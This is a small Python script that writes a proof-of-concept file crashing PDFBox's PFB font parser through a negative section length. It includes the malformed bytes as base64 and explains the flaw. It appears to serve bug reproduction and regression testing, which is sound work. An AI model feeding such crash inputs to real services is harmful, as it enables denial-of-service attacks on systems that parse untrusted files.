#!/usr/bin/env python3
"""Generate PoC for pdfbox-pfb-negative-array.

PFB files start with a one-byte tag (0x80) followed by a one-byte
section type, then a 4-byte little-endian section length. PfbParser
reads the length into a Java int without sign-checking, so a section
length of 0xff_ff_ff_ff becomes -1, and the subsequent
`new byte[length]` raises NegativeArraySizeException.

This payload is verbatim from the upstream PR #412 Reproduce.java.
"""
import base64


def create_poc(output='poc.bin'):
    # Base64 verbatim from upstream PR #412.
    blob = base64.b64decode("gAEBAAD/////////JwX4/9JA")
    with open(output, 'wb') as f:
        f.write(blob)
    print(f"wrote {output} ({len(blob)} bytes)")


if __name__ == '__main__':
    create_poc()
